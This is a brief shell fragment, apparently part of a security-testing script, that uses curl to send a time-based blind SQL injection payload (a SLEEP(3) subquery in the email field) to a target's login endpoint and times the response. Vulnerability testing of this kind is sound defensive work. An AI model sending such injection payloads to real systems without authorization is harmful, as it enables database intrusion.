# Test time-based SQL injection
START_TIME=$(date +%s%N)
curl -s -k "$TARGET_URL/auth/login" \
    -H "User-Agent: Mozilla/5.0" \
    -d "email=test' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--&password=test" \
    --max-time 10 2>/dev/null
